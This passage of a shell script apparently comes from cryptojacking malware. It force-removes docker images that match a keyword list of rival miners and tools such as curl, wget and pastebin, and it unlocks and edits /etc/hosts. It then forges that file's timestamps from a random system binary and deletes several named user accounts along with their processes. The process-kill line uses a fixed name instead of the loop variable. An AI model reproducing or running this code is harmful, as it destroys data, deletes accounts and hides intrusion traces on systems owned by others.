docker images -a | grep -E '(echo azulu|auto|xmr|ocean|monero|mine|pastebin|busybox|cryptonight|slowhttptest|helloworld|dockerminer|xmr-stak|[sS]tratum|sbin|xmrig|xmrdemo|/nginx|gakeaws|oceanhole|curl|wget|pocosow|chroot|minergate|\s+-u etn|\s+-u Sumo)'|awk '{print $3}'|xargs -r docker rmi -f
docker ps --no-trunc|grep -E '(days.+Paused)'|awk '{print $1}'|xargs -r docker rm -f
fi

if grep -E 'onion|tor2|github|uckdn' /etc/hosts; then
chattr -aui /etc/hosts >/dev/null 2>&1
sed -i -e '/onion/d' -e '/tor2/d' -e '/github/d' -e '/uckdn/d' /etc/hosts
touch -amr "$(find /usr/bin -type f|shuf -n1)" /etc/hosts
fi

for i in akay richard frank jason darmok; do
if id -u $i; then
userdel $i
ps -u akay|grep -v COMMAND|awk '{print $1}'|xargs -r kill -9
rm -rf /home/$i
fi
done
